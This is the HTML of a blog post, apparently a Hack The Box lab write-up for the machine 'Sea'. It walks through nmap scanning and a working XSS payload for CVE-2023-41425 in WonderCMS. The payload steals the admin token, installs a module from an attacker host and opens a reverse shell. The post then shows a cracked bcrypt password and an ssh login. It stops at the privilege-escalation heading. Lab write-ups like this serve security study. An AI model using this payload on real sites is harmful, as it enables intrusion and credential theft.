@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2024/12/20/hackthebox-sea/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSea is an easy-difficulty machine from Hack The Box that initially deals with CVE-2023-41425 which is an XSS vulnerabiity in WonderCMS leading to a remote code execution and then database cred">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Sea">
+<meta property="og:url" content="http://fouedsaidi.com/2024/12/20/Hackthebox-Sea/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSea is an easy-difficulty machine from Hack The Box that initially deals with CVE-2023-41425 which is an XSS vulnerabiity in WonderCMS leading to a remote code execution and then database cred">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sea/Sea.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sea/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sea/web2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sea/web3.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sea/web4.png">
+<meta property="article:published_time" content="2024-12-20T06:48:46.000Z">
+<meta property="article:modified_time" content="2024-12-20T08:14:04.310Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sea/Sea.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Sea -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Sea</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-20 07:48:46</span>
+        <span class="mobile">2024-12-20 07:48:46</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-20 09:14:04</span>
+            <span class="mobile">2024-12-20 09:14:04</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Sea is an easy-difficulty machine from Hack The Box that initially deals with CVE-2023-41425 which is an XSS vulnerabiity in WonderCMS leading to a remote code execution and then database credentials exfiltration. And finally we’ll be abusing a command injection in an internal monitoring service running as root to pwn the machine.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sea/Sea.png"
+                      alt="Sea-info-card"
+                ><figcaption>Sea-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">77.74</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-12-20</span> <span class="number">07</span>:<span class="number">54</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">77.74</span></span><br><span class="line">Host is up (<span class="number">0.29</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">11</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">3072</span> e3:<span class="number">54</span>:e0:<span class="number">72</span>:<span class="number">20</span>:<span class="number">3</span>c:<span class="number">01</span>:<span class="number">42</span>:<span class="number">93</span>:d1:<span class="number">66</span>:<span class="number">9</span>d:<span class="number">90</span>:<span class="number">0</span>c:ab:e8 (RSA)</span><br><span class="line">|   <span class="number">256</span> f3:<span class="number">24</span>:<span class="number">4</span>b:<span class="number">08</span>:aa:<span class="number">51</span>:<span class="number">9</span>d:<span class="number">56</span>:<span class="number">15</span>:<span class="number">3</span>d:<span class="number">67</span>:<span class="number">56</span>:<span class="number">74</span>:<span class="number">7</span>c:<span class="number">20</span>:<span class="number">38</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">30</span>:b1:<span class="number">05</span>:c6:<span class="number">41</span>:<span class="number">50</span>:ff:<span class="number">22</span>:a3:<span class="number">7</span>f:<span class="number">41</span>:<span class="number">06</span>:<span class="number">0</span>e:<span class="number">67</span>:fd:<span class="number">50</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">41</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Sea - Home</span><br><span class="line">| http<span class="literal">-cookie-flags</span>:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">54.97</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our typical ports 22 for ssh and 80 for http without any apparent redirect.</p>
+<h3 id="Web-Application-http-10-129-77-74"><a href="#Web-Application-http-10-129-77-74" class="headerlink" title="Web Application - http://10.129.77.74"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://10.129.77.74/" >http://10.129.77.74 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>We are prompted with a simple web application without any clear features:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sea/web.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>Checking the contact button, we can see it redirects to this link: <a class="link"   target="_blank" rel="noopener" href="http://sea.htb/contact.php" >http://sea.htb/contact.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, so let’s go ahead and add <code>sea.htb</code> to our <code>/etc/hosts</code> file.</p>
+<p>Then I simply just right clicked on the cover picture to search for it on google hoping to find something interesting:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sea/web2.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>And I did! This turns out to be a CMS called <a class="link"   target="_blank" rel="noopener" href="https://www.wondercms.com/" >WonderCMS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and we are also prompted with a CVE for it in the first link! How lucky are we lol.</p>
+<h4 id="CVE-2023-41425"><a href="#CVE-2023-41425" class="headerlink" title="CVE-2023-41425"></a>CVE-2023-41425</h4><p><a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-41425" >CVE-2023-41425 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> is a Cross Site Scripting (XSS) vulnerability in WonderCMS v3.2.0 thru v3.4.2 allowing for arbitrary code execution by uploading a malicious module to the <code>installModule</code> feature.</p>
+<p>This will be our xss.js code:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://sea.htb/loginURL&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (url.<span class="title function_">endsWith</span>(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line"> url = url.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> urlWithoutLog = url.<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> urlWithoutLogBase = <span class="keyword">new</span> <span class="title function_">URL</span>(urlWithoutLog).<span class="property">pathname</span>;</span><br><span class="line"><span class="keyword">var</span> token = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;[name=&quot;token&quot;]&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> urlRev = urlWithoutLogBase+<span class="string">&quot;/?installModule=http://10.10.x.x/revshell-main.zip&amp;directoryName=violet&amp;type=themes&amp;token=&quot;</span> + token;</span><br><span class="line"><span class="keyword">var</span> xhr3 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr3.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">xhr3.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, urlRev);</span><br><span class="line">xhr3.<span class="title function_">send</span>();</span><br><span class="line">xhr3.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="keyword">if</span> (xhr3.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> xhr4 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">   xhr4.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">   xhr4.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, urlWithoutLogBase+<span class="string">&quot;/themes/revshell-main/rev.php&quot;</span>);</span><br><span class="line">   xhr4.<span class="title function_">send</span>();</span><br><span class="line">   xhr4.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (xhr4.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> ip = <span class="string">&quot;10.10.x.x&quot;</span>;</span><br><span class="line">       <span class="keyword">var</span> port = <span class="string">&quot;9001&quot;</span>;</span><br><span class="line">       <span class="keyword">var</span> xhr5 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">       xhr5.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">       xhr5.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, urlWithoutLogBase+<span class="string">&quot;/themes/revshell-main/rev.php?lhost=&quot;</span> + ip + <span class="string">&quot;&amp;lport=&quot;</span> + port);</span><br><span class="line">       xhr5.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>We should be hosting our xss.js on a local python web server, and then wait for the server to fetch our revshell-main.zip file.</p>
+<p>And we have our reverse shell!!<br>Once we’re in, I start looking into database files to find something of interest:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@sea:/var/www/sea/data$ <span class="built_in">cat</span> database.js</span><br><span class="line"><span class="built_in">cat</span> database.js</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;siteTitle&quot;</span>: <span class="string">&quot;Sea&quot;</span>,</span><br><span class="line">        <span class="string">&quot;theme&quot;</span>: <span class="string">&quot;bike&quot;</span>,</span><br><span class="line">        <span class="string">&quot;defaultPage&quot;</span>: <span class="string">&quot;home&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>: <span class="string">&quot;loginURL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;forceLogout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;forceHttps&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;saveChangesPopup&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;$2y$10<span class="variable">$iOrk210RQSAzNCx6Vyq2X</span>.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lastLogins&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;2024\/08\/11 11:17:32&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2024\/08\/11 11:17:02&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2024\/08\/11 11:15:32&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2024\/08\/11 11:15:02&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br></pre></td></tr></table></figure></div>
+
+<p>And I got a password hash that we can simply crack using johntheripper:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/sea]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&#x27;$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q&#x27;</span> &gt; hash.txt                                                            1 ⨯</span><br><span class="line">                                                                                                                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/sea]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt             </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">mychemicalromance (?)</span><br><span class="line">1g 0:00:00:14 DONE (2024-08-11 07:28) 0.06798g/s 208.0p/s 208.0c/s 208.0C/s iamcool..memories</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure></div>
+
+<p>I can now ssh into the machine using <code>amay</code> user that we find from the home directory and we can get our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">amay@sea:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">e795f4db1c6f32******************</span><br><span class="line">amay@sea:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(amay) gid=1000(amay) <span class="built_in">groups</span>=1000(amay)</span><br><span class="line">amay@sea:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-root"><a href="#Privilege-Escalation-to-root" class="headerlink" title="Privilege Escalation to root"></a>Privilege Escalation to root</h3><p>Checking the available network services running, I find an intriguing port 8080:</p>
